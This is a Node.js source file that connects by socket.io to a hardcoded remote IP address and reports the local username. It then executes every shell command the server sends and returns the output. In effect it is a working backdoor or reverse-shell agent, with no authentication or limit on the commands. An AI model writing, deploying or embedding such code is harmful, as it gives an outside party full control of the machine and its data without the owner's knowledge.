const PORT = 7681;
const { exec } = require("child_process");
const io = require("socket.io-client");

// const connectionAddr = "http://localhost";
const connectionAddr = "http://18.222.251.5";
const socket = io.connect(`${connectionAddr}:${PORT}`, {
  reconnection: true,
});

let USER = "";

let currentDirectory = process.cwd();

console.log("Current directory:", currentDirectory);

exec("echo $USER", (err, stdout, stderr) => {
  if (err) console.log("There was a node error: ", err);
  if (stderr) console.log("There was a bash error: ", stderr);
  else USER = stdout;
});

socket.on("connect", () => {
  log("info", "Connected to server");
  socket.emit("new-user", USER);
});

socket.on("perform-command", (data) => {
  const { user, command } = data;
  log("command", `${command}`);
  let result = "";
  let finalCommand = command;
  if (command.substr(0, 3) === "cd ") {
    finalCommand += "; pwd";
  }

  exec(finalCommand, { cwd: currentDirectory }, (err, stdout, stderr) => {
    if (err) {
      result = "Error. Command failed\n";
    } else if (stderr) {
      result = "Error. Command failed\n";
    } else {
      result = stdout;
      if (command.substr(0, 3) === "cd ") {
        currentDirectory = result.substr(0, result.length - 1);
      }
    }

    log("result", `${result}`);
    socket.emit("performed-command", {
      command: command,
      result: result,
      user: user,
    });
  });
});

function log(title, message) {
  console.log(`[${title.toUpperCase()}] ${message}`);
}
